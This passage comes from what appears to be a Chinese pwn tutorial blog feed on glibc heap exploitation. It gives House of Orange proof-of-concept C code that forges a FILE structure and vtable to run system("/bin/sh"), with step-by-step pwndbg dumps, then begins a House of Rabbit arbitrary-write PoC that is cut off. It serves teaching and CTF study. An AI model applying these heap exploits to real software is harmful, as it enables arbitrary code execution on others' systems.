class="string">"system将通过top指针被调用，使用用/bin/sh填充前8个字节，相当于system(/bin/sh)\n"</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>( ( <span class="keyword">char</span> *) top, <span class="string">"/bin/sh\x00"</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"将top chunk的size改小，使旧的top chunk被malloc分配到small bin[4]，指向伪文件指针的fd-ptr\n\n"</span>);</span><br><span class="line">    top[<span class="number">1</span>] = <span class="number">0x61</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"满足条件 fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base\n"</span>);</span><br><span class="line">    _IO_FILE *fp = (_IO_FILE *) top;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"满足 fp-&gt;_mode &lt;= 0\n"</span> );</span><br><span class="line">    fp-&gt;_mode = <span class="number">0</span>; <span class="comment">// top+0xc0</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"满足 fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base\n"</span>);</span><br><span class="line">    fp-&gt;_IO_write_base = (<span class="keyword">char</span> *) <span class="number">2</span>; <span class="comment">// top+0x20</span></span><br><span class="line">    fp-&gt;_IO_write_ptr = (<span class="keyword">char</span> *) <span class="number">3</span>; <span class="comment">// top+0x28</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"设置跳板指向可控内存\n\n"</span>);</span><br><span class="line">    <span class="keyword">size_t</span> *jump_table = &amp;top[<span class="number">12</span>]; <span class="comment">// 可控内存</span></span><br><span class="line">    jump_table[<span class="number">3</span>] = (<span class="keyword">size_t</span>) &amp;winner;</span><br><span class="line">    *(<span class="keyword">size_t</span> *) ((<span class="keyword">size_t</span>) fp + <span class="keyword">sizeof</span>(_IO_FILE)) = (<span class="keyword">size_t</span>) jump_table; <span class="comment">// top+0xd8</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"malloc触发利用链\n"</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">winner</span><span class="params">(<span class="keyword">char</span> *ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    system(ptr);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><a href="https://i.loli.net/2020/01/28/SwRgapBuTN7ZACW.png" data-fancybox="group" data-caption="image.png" class="fancybox"><img alt="image.png" title="image.png" data-src="https://i.loli.net/2020/01/28/SwRgapBuTN7ZACW.png" class="lazyload"></a></p><p><a href="https://i.loli.net/2020/01/28/UN84qTwetEmMzyf.png" data-fancybox="group" data-caption="image.png" class="fancybox"><img alt="image.png" title="image.png" data-src="https://i.loli.net/2020/01/28/UN84qTwetEmMzyf.png" class="lazyload"></a></p><h3 id="分步分析-3"><a href="#分步分析-3" class="headerlink" title="分步分析"></a>分步分析</h3><h4 id="1-申请chunk1，修改top-chunk"><a href="#1-申请chunk1，修改top-chunk" class="headerlink" title="1 申请chunk1，修改top chunk"></a>1 申请chunk1，修改top chunk</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">p1 = <span class="built_in">malloc</span>(<span class="number">0x400</span><span class="number">-16</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"设置top chunk+size页面对齐，设置prev_inuse位\n\n"</span>);</span><br><span class="line">top = (<span class="keyword">size_t</span> *) ( (<span class="keyword">char</span> *) p1 + <span class="number">0x400</span> - <span class="number">16</span>);</span><br><span class="line">top[<span class="number">1</span>] = <span class="number">0xc01</span>;</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">0x603000 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 1025, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x603400 PREV_INUSE &#123;    &lt;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; chunk1</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 3073, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x604000 &#123;               &lt;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; top chunk</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 0, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x&#x2F;40xg 0x603400-0x400</span><br><span class="line">0x603000:0x00000000000000000x0000000000000401 &lt;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; chunk1</span><br><span class="line">0x603010:0x00000000000000000x0000000000000000</span><br><span class="line">0x603020:0x00000000000000000x0000000000000000</span><br><span class="line">                   ...</span><br><span class="line">0x6033f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x603400:0x00000000000000000x0000000000000c01 &lt;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; top chunk</span><br><span class="line">0x603410:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure></div><h4 id="2-申请一个size大于top-chunk的块"><a href="#2-申请一个size大于top-chunk的块" class="headerlink" title="2 申请一个size大于top chunk的块"></a>2 申请一个size大于top chunk的块</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">p2 = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">malloc p2前</span><br><span class="line"></span><br><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">          0x400000           0x401000 r-xp     1000 0      /home/kabeo/Desktop/how2heap/glibc_2.25/house_of_orange1</span><br><span class="line">          0x601000           0x602000 r--p     1000 1000   /home/kabeo/Desktop/how2heap/glibc_2.25/house_of_orange1</span><br><span class="line">          0x602000           0x603000 rw-p     1000 2000   /home/kabeo/Desktop/how2heap/glibc_2.25/house_of_orange1</span><br><span class="line">          0x603000           0x624000 rw-p    21000 0      [heap]  &lt;========= 0x603000-0x624000</span><br><span class="line">    0x7ffff7a0d000     0x7ffff7bcd000 r-xp   1c0000 0      /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7bcd000     0x7ffff7dcd000 ---p   200000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7dcd000     0x7ffff7dd1000 r--p     4000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7dd1000     0x7ffff7dd3000 rw-p     2000 1c4000 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7dd3000     0x7ffff7dd7000 rw-p     4000 0      </span><br><span class="line">    0x7ffff7dd7000     0x7ffff7dfd000 r-xp    26000 0      /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">    0x7ffff7fdd000     0x7ffff7fe0000 rw-p     3000 0      </span><br><span class="line">    0x7ffff7ff7000     0x7ffff7ffa000 r--p     3000 0      [vvar]</span><br><span class="line">    0x7ffff7ffa000     0x7ffff7ffc000 r-xp     2000 0      [vdso]</span><br><span class="line">    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000 25000  /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000 26000  /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000 0      </span><br><span class="line">    0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">malloc p2后</span><br><span class="line"></span><br><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">          0x400000           0x401000 r-xp     1000 0      /home/kabeo/Desktop/how2heap/glibc_2.25/house_of_orange1</span><br><span class="line">          0x601000           0x602000 r--p     1000 1000   /home/kabeo/Desktop/how2heap/glibc_2.25/house_of_orange1</span><br><span class="line">          0x602000           0x603000 rw-p     1000 2000   /home/kabeo/Desktop/how2heap/glibc_2.25/house_of_orange1</span><br><span class="line">          0x603000           0x646000 rw-p    43000 0      [heap]  &lt;========= 0x603000-0x646000</span><br><span class="line">    0x7ffff7a0d000     0x7ffff7bcd000 r-xp   1c0000 0      /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7bcd000     0x7ffff7dcd000 ---p   200000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7dcd000     0x7ffff7dd1000 r--p     4000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7dd1000     0x7ffff7dd3000 rw-p     2000 1c4000 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7dd3000     0x7ffff7dd7000 rw-p     4000 0      </span><br><span class="line">    0x7ffff7dd7000     0x7ffff7dfd000 r-xp    26000 0      /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">    0x7ffff7fdd000     0x7ffff7fe0000 rw-p     3000 0      </span><br><span class="line">    0x7ffff7ff7000     0x7ffff7ffa000 r--p     3000 0      [vvar]</span><br><span class="line">    0x7ffff7ffa000     0x7ffff7ffc000 r-xp     2000 0      [vdso]</span><br><span class="line">    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000 25000  /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000 26000  /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000 0      </span><br><span class="line">    0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]</span><br></pre></td></tr></table></figure></div><h4 id="3-构造-IO-list-all指针"><a href="#3-构造-IO-list-all指针" class="headerlink" title="3 构造_IO_list_all指针"></a>3 构造_IO_list_all指针</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">io_list_all = top[<span class="number">2</span>] + <span class="number">0x9a8</span>;</span><br><span class="line"></span><br><span class="line">top[<span class="number">3</span>] = io_list_all - <span class="number">0x10</span>;</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;10xg 0x603400</span><br><span class="line">0x603400:0x00000000000000000x0000000000000be1</span><br><span class="line">0x603410:0x00007ffff7dd1b780x00007ffff7dd2510   fd   bk</span><br><span class="line">0x603420:0x00000000000000000x0000000000000000</span><br><span class="line">0x603430:0x00000000000000000x0000000000000000</span><br><span class="line">0x603440:0x00000000000000000x0000000000000000</span><br><span class="line"></span><br><span class="line">pwndbg&gt; unsortedbin </span><br><span class="line">unsortedbin</span><br><span class="line">all [corrupted]</span><br><span class="line">FD: 0x603400 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x603400</span><br><span class="line">BK: 0x603400 —▸ 0x7ffff7dd2510 ◂— 0x0</span><br></pre></td></tr></table></figure></div><h4 id="4构造system-bin-sh-，缩小top-chunk"><a href="#4构造system-bin-sh-，缩小top-chunk" class="headerlink" title="4构造system(/bin/sh)，缩小top chunk"></a>4构造system(/bin/sh)，缩小top chunk</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">memcpy</span>( ( <span class="keyword">char</span> *) top, <span class="string">"/bin/sh\x00"</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">top[<span class="number">1</span>] = <span class="number">0x61</span>;</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;10xg 0x603400</span><br><span class="line">0x603400:0x0068732f6e69622f0x0000000000000061</span><br><span class="line">0x603410:0x00007ffff7dd1b780x00007ffff7dd2510</span><br><span class="line">0x603420:0x00000000000000000x0000000000000000</span><br><span class="line">0x603430:0x00000000000000000x0000000000000000</span><br><span class="line">0x603440:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure></div><h4 id="5-满足条件-fp-gt-mode-lt-0-amp-amp-fp-gt-IO-write-ptr-gt-fp-gt-IO-write-base"><a href="#5-满足条件-fp-gt-mode-lt-0-amp-amp-fp-gt-IO-write-ptr-gt-fp-gt-IO-write-base" class="headerlink" title="5 满足条件 fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base"></a>5 满足条件 fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_FILE *fp = (_IO_FILE *) top;</span><br><span class="line"></span><br><span class="line">fp-&gt;_mode = <span class="number">0</span>; <span class="comment">// top+0xc0</span></span><br><span class="line"></span><br><span class="line">fp-&gt;_IO_write_base = (<span class="keyword">char</span> *) <span class="number">2</span>; <span class="comment">// top+0x20</span></span><br><span class="line">fp-&gt;_IO_write_ptr = (<span class="keyword">char</span> *) <span class="number">3</span>; <span class="comment">// top+0x28</span></span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;10xg 0x00007ffff7dd2510</span><br><span class="line">0x7ffff7dd2510:0x00000000000000000x0000000000000000</span><br><span class="line">0x7ffff7dd2520 &lt;_IO_list_all&gt;:0x00007ffff7dd25400x0000000000000000</span><br><span class="line">0x7ffff7dd2530:0x00000000000000000x0000000000000000</span><br><span class="line">0x7ffff7dd2540 &lt;_IO_2_1_stderr_&gt;:0x00000000fbad28870x00007ffff7dd25c3</span><br><span class="line">0x7ffff7dd2550 &lt;_IO_2_1_stderr_+16&gt;:0x00007ffff7dd25c30x00007ffff7dd25c3</span><br></pre></td></tr></table></figure></div><h4 id="6-设置跳板指向可控内存"><a href="#6-设置跳板指向可控内存" class="headerlink" title="6 设置跳板指向可控内存"></a>6 设置跳板指向可控内存</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">size_t</span> *jump_table = &amp;top[<span class="number">12</span>]; <span class="comment">// 可控内存</span></span><br><span class="line">jump_table[<span class="number">3</span>] = (<span class="keyword">size_t</span>) &amp;winner;</span><br><span class="line">*(<span class="keyword">size_t</span> *) ((<span class="keyword">size_t</span>) fp + <span class="keyword">sizeof</span>(_IO_FILE)) = (<span class="keyword">size_t</span>) jump_table; <span class="comment">// top+0xd8</span></span><br></pre></td></tr></table></figure></div><h4 id="7-malloc触发利用链"><a href="#7-malloc触发利用链" class="headerlink" title="7 malloc触发利用链"></a>7 malloc触发利用链</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(<span class="number">10</span>);</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;10xg 0x00007ffff7dd1b78</span><br><span class="line">0x7ffff7dd1b78 &lt;main_arena+88&gt;:0x000055555577cc300x0000000000000000</span><br><span class="line">0x7ffff7dd1b88 &lt;main_arena+104&gt;:0x00007ffff7dd1b780x00007ffff7dd1b78</span><br><span class="line">0x7ffff7dd1b98 &lt;main_arena+120&gt;:0x00007ffff7dd1b880x00007ffff7dd1b88</span><br><span class="line">0x7ffff7dd1ba8 &lt;main_arena+136&gt;:0x00007ffff7dd1b980x00007ffff7dd1b98</span><br><span class="line">0x7ffff7dd1bb8 &lt;main_arena+152&gt;:0x00007ffff7dd1ba80x00007ffff7dd1ba8</span><br></pre></td></tr></table></figure></div><p><a href="https://i.loli.net/2020/01/28/6OFEXu4a1iCAsQh.png" data-fancybox="group" data-caption="image.png" class="fancybox"><img alt="image.png" title="image.png" data-src="https://i.loli.net/2020/01/28/6OFEXu4a1iCAsQh.png" class="lazyload"></a></p><h3 id="利用思路-2"><a href="#利用思路-2" class="headerlink" title="利用思路"></a>利用思路</h3><p>在<code>glibc-2.23</code>之前没有检查，可直接构造假的<code>stdout</code>，触发libc的<code>abort</code>，利用<code>abort</code>中的<code>_IO_flush_all_lockp</code>来达到控制程序流的目的。</p><p>在<code>glibc-2.23</code>之后增加了<code>_IO_vtable_check</code></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Perform vtable pointer validation.  If validation fails, terminate</span></span><br><span class="line"><span class="comment">   the process.  */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *</span></span><br><span class="line"><span class="class"><span class="title">IO_validate_vtable</span> (<span class="title">const</span> <span class="title">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span></span><br><span class="line"><span class="comment">     section.  */</span></span><br><span class="line">  <span class="keyword">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *ptr = (<span class="keyword">const</span> <span class="keyword">char</span> *) vtable;</span><br><span class="line">  <span class="keyword">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>要求<code>vtable</code>必须在<code>__stop___libc_IO_vtables</code>和<code>__start___libc_IO_vtables</code>之间，这就意味着不能利用任意地址来充当<code>vtable</code>。可以将<code>vtable</code>指向<code>_IO_str_jumps</code>，将<code>fp</code>的<code>0xe8</code>偏移覆盖为<code>system</code>函数，<code>fp</code>的<code>0x38</code>偏移覆盖为<code>/bin/sh</code>字符串，就能get shell。</p><p>在<code>glibc-2.27</code>以及之后的源码中，abort中没有刷新流的操作</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Send signal which possibly calls a user handler.  */</span></span><br><span class="line"><span class="keyword">if</span> (stage == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* This stage is special: we must allow repeated calls of</span></span><br><span class="line"><span class="comment"> `abort' when a user defined handler for SIGABRT is installed.</span></span><br><span class="line"><span class="comment"> This is risky since the `raise' implementation might also</span></span><br><span class="line"><span class="comment"> fail but I don't see another possibility.  */</span></span><br><span class="line">  <span class="keyword">int</span> save_stage = stage;</span><br><span class="line"></span><br><span class="line">  stage = <span class="number">0</span>;</span><br><span class="line">  __libc_lock_unlock_recursive (lock);</span><br><span class="line"></span><br><span class="line">  raise (SIGABRT);</span><br><span class="line"></span><br><span class="line">  __libc_lock_lock_recursive (lock);</span><br><span class="line">  stage = save_stage + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>因此不再容易利用。</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;House-of-系列堆漏洞详解-一&quot;&gt;&lt;a href=&quot;#House-of-系列堆漏洞详解-一&quot; class=&quot;headerlink&quot; title=&quot;House of 系列堆漏洞详解(一)&quot;&gt;&lt;/a&gt;House of</summary>
        
      
    
    
    
    <category term="Pwn" scheme="https://kabeor.github.io/categories/Pwn/"/>
    
    
    <category term="Pwn" scheme="https://kabeor.github.io/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>House of 系列堆漏洞详解(二)</title>
    <link href="https://kabeor.github.io/House%20of%20%E7%B3%BB%E5%88%97%E5%A0%86%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3(%E4%BA%8C)/"/>
    <id>https://kabeor.github.io/House%20of%20%E7%B3%BB%E5%88%97%E5%A0%86%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3(%E4%BA%8C)/</id>
    <published>2020-03-04T16:00:00.000Z</published>
    <updated>2020-03-16T04:43:48.783Z</updated>
    
    <content type="html"><![CDATA[<h1 id="House-of-系列堆漏洞详解-二"><a href="#House-of-系列堆漏洞详解-二" class="headerlink" title="House of 系列堆漏洞详解(二)"></a>House of 系列堆漏洞详解(二)</h1><p>首发于<a href="https://xz.aliyun.com/t/7267" target="_blank" rel="noopener">先知社区</a></p><h2 id="House-of-Rabbit"><a href="#House-of-Rabbit" class="headerlink" title="House of Rabbit"></a>House of Rabbit</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>如果程序同时满足以下三个条件</p><ol><li>可以分配任意大小的堆块并且释放，主要包括三类fastbin大小的堆块、smallbin大小的堆块、较大的堆块（用于分配到任意地址处）</li><li>存在一块已知地址的内存空间，并可以任意写至少<strong>0x20</strong>长度的字节</li><li>存在fastbin dup、UAF等漏洞，用于劫持fastbin的fd指针。</li></ol><p>当通过malloc函数分配内存时，当超过某特定阈值时，堆块会由mmap来分配，但同时会改变该阈值。通过连续malloc然后free两次超大chunk，会扩大top chunk的size。在申请一个fast chunk和一个small chunk，保证small chunk紧邻top chunk。在可控内存处伪造两个chunk，一个大小为0x11，绕过检查，一个为0xfffffffffffffff1，保证可覆盖任意地址并设置了inuse位。再利用其他漏洞将0xfffffffffffffff1大小的fake chunk链接到fast bin链表。free触发malloc_consolidate，用于对fastbin合并，并放到unsorted bin中。再申请一个超大 chunk，0xfffffffffffffff1大小的fake chunk会链接到 largebin，最后申请任意长度的地址，使堆块地址上溢到当前堆地址的低地址位置，从而可以分配到任意地址，达到内存任意写的目的。</p><h3 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">evict_tcache</span><span class="params">(<span class="keyword">size_t</span> <span class="built_in">size</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> target[<span class="number">0x30</span>] = <span class="string">"Hello, World!"</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> gbuf[<span class="number">8</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"><span class="keyword">void</span> *p, *fast, *small, *fake;</span><br><span class="line"><span class="keyword">char</span> *victim;</span><br><span class="line"></span><br><span class="line">setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//在不泄漏地址的情况下绕过堆ASLR，使覆盖位于任意地址的变量成为可能。</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"House of Rabbit Poc\n\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0. 关闭 0x20,0x90 chunks 的tcache (glibc version &gt;= 2.26)\n\n"</span>);</span><br><span class="line">evict_tcache(<span class="number">0x18</span>);</span><br><span class="line">evict_tcache(<span class="number">0x88</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"1. 'av-&gt;system_mem &gt; 0xa00000'\n"</span>);</span><br><span class="line">p = <span class="built_in">malloc</span>(<span class="number">0xa00000</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" 在 %p 通过mmap申请0xa00000 byte大小的内存, 然后 free.\n"</span>, p);</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line"></span><br><span class="line">p = <span class="built_in">malloc</span>(<span class="number">0xa00000</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"   在 %p 通过mmap申请0xa00000 byte大小的内存, 然后 free.\n"</span>, p);</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" 'av-&gt;system_mem' 将会比 0xa00000 大.\n\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"2. Free fast chunk 插入 fastbins 链表\n"</span>);</span><br><span class="line">fast = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">small = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  